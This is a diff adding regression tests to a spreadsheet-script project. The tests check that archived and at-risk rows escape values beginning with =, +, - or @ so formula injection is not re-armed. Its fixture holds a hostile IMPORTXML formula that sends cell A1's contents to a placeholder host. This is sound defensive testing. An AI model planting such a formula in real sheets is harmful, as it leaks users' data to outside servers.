@@ -227,4 +227,51 @@ function baseSheets(overrides) {
   });
 }
 
+// ---- 7. r35.2 (review_r35_1_server M1): nightly copies stay text ----------
+// cellSafe's apostrophe protects ONE write: Sheets returns the text without it,
+// and a nightly setValues of what was read back re-armed '=…' as a formula.
+// (The mock sheet keeps what was written, so a value "read back" here is the
+// raw text a real sheet would return.)
+const FORMULA = '=IMPORTXML("https://x.invalid/?"&A1,"//a")';
+{
+  const sheets = baseSheets();
+  const hostile = pend(1100, 30);
+  hostile[2] = FORMULA; hostile[3] = '+972500000001'; hostile[7] = '@pop'; hostile[8] = '-B';
+  sheets['ממתינים'].splice(1, 0, hostile);
+  const oldResult = res(3100, 60);
+  oldResult[2] = FORMULA;
+  sheets['תוצאות'].splice(1, 0, oldResult);
+  const env = createEnv({ sheets, now: NOW });
+  env.ctx.archiveSheets();
+  const archived = plain(env.rows('ממתינים_ארכיון')).find(r => String(r[1]) === '1100');
+  check('the archive writes read-back text as text: names, phones, anything starting = + - @', () => {
+    assert.deepEqual([archived[2], archived[3], archived[7], archived[8]], ['\'' + FORMULA, '\'+972500000001', '\'@pop', '\'-B']);
+    const archivedResult = plain(env.rows('תוצאות_ארכיון')).find(r => String(r[1]) === '3100');
+    assert.equal(archivedResult[2], '\'' + FORMULA);
+  });
+  check('and leaves everything else exactly as it was', () => {
+    assert.equal(archived[5], 'completed');
+    assert.equal(archived[4], hostile[4], 'the ISO timestamp');
+    const plainRow = plain(env.rows('ממתינים_ארכיון')).find(r => String(r[1]) === '1000');
+    assert.deepEqual(plainRow, pend(1000, 30), 'an ordinary row is copied unchanged');
+    assert.deepEqual(plain(env.rows('ממתינים_ארכיון')[0]), PEND_HEADER, 'the header too');
+  });
+}
+{
+  const env = createEnv({ sheets: baseSheets({ 'חיזוי סיכון': [['header']] }), now: NOW });
+  env.ctx.computeAtRiskAll = () => ({ computedAtMs: NOW, summary: {}, modelBaseRate: 0.5, students: [{
+    name: FORMULA, license: '@B', classCode: '-CLS', teacherId: '222222222', teacherName: '+t', className: '=c', site: '@s',
+    lastPct: 40, sessions: 3, trend: -5, attempt: 1, everTested: false, prob: 0.2, tier: 'high', confidence: 'low',
+    matchedByPhone: false, phone: '+972500000002' }] });
+  env.ctx.rebuildAtRiskCache();
+  const row = plain(env.rows('חיזוי סיכון'))[1];
+  check('the at-risk sheet writes the names it read back from practice as text', () => {
+    assert.deepEqual([row[1], row[2], row[3], row[5], row[6], row[7], row[17]],
+      ['\'' + FORMULA, '\'@B', '\'-CLS', '\'+t', '\'=c', '\'@s', '\'+972500000002']);
+  });
+  check('numbers and flags in the at-risk row are untouched', () => {
+    assert.deepEqual([row[8], row[9], row[10], row[11], row[12], row[13], row[16]], [40, 3, -5, 1, false, 0.2, false]);
+  });
+}
+
 console.log('\n' + checks + ' archive checks passed');
